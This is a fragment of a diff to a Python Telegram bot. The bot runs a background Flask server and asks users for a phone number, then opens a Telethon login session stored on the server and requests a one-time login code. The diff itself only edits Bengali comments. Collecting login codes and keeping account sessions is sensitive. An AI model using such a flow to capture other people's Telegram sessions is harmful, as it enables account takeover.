@@ -31,7 +31,7 @@ def run_web():
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
 
-# ওয়ান-টাইম ওয়েব সার্ভার স্টার্ট
+# ওয়েব সার্ভার ব্যাকগ্রাউন্ডে স্টার্ট করা হচ্ছে
 Thread(target=run_web, daemon=True).start()
 
 @bot.message_handler(commands=['start'])
@@ -110,12 +110,10 @@ def handle_text(message):
         clean_phone = phone_number.replace("+", "").replace(" ", "")
         temp_session_path = os.path.join(STORAGE_DIR, f"temp_{clean_phone}")
         
-        # Telethon ক্লায়েন্ট সিঙ্ক উপায়ে তৈরি করা হচ্ছে
         user_client = TelegramClient(temp_session_path, API_ID, API_HASH)
         user_client.connect()
         
         try:
-            # ওটিপি পাঠানো
             sent_code = user_client.send_code_request(phone_number)
             user_data[user_id] = {
                 "client": user_client, "phone": phone_number,
